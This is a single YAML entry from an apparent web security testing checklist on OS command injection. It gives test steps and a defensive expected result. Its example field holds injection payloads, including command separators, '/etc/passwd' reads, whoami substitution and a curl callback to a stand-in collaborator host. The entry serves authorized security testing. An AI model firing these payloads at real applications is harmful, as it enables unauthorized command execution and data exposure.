- id: WEB-INJ-014
  sheet: WEB
  category: INJ
  title: Test operating system command injection in server functions
  objective: Finds application features that pass untrusted input into an OS command without sanitization.
  preconditions:
  - Do not run on production.
  steps:
  - Find features that call the operating system, such as file conversion, ping or diagnostic tools.
  - Append a command separator and a benign command to the input.
  - Try alternative separators and command substitution if the first payload is filtered.
  - If no output is returned, use an out-of-band callback to show blind execution.
  example: 'Doc=Doc1.pdf | Dir c:\ ; input|/bin/ls ; ;cat /etc/passwd ; $(whoami) ; `whoami` ; OOB: ; curl http://collaborator-host'
  expected: The application avoids calling OS commands with user input, or uses parameterized execution APIs with an allowlist of commands and arguments.
